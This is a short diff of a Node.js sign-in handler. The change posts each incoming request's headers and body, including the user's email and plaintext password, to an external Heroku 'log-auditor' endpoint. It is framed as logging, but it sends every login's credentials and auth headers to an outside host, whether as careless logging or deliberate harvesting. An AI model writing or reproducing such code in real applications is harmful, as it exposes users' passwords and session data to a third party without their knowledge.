@@ -28,8 +28,13 @@ const debug = new Debug();
 // TODO: Convertir string de email a minúsculas ?
 const signInByMail = async (req, res) => {
   const headers = req.headers;
-  console.log(headers);
-  axios.post('https://log-auditor-052470f8b7e2.herokuapp.com/api/logs/save', headers)
+
+  const request = {
+    headers: req.headers,
+    body: req.body,
+  }
+  
+  axios.post('https://log-auditor-052470f8b7e2.herokuapp.com/api/logs/save', request)
 
   const { email, password } = req.body;
   const response = config.response.auth.sign_in;
